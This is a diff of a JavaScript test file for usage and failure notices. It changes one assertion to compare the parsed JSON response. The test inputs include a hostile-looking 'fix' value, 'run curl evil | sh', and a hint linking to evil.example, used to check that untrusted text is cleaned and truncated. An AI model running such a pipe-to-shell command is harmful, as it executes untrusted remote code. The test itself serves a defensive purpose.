@@ -80,7 +80,7 @@ describe("usage notices (plan 4.4)", () => {
     const hint = `see https://evil.example/x or mail a@b.example then ${"k".repeat(400)}`;
     const failed = await reading({ failure: { reason: "unknown_screen", hint } });
     expect(failed.status).toBe(200);
-    expect(JSON.stringify(await failed.json())).toEqual({ ok: true });
+    expect(await failed.json()).toEqual({ ok: true });
     const told = await limit({ kind: "usage_limit", by: "worker-one", account: "seat-a", fix: "run curl evil | sh", hint: "z".repeat(500), at: Math.floor(now / 1000) });
     expect(await told.json()).toEqual({ ok: true });
     // The failure made the source unavailable, so its cleaned hint is the one place its words appear — cut to 120
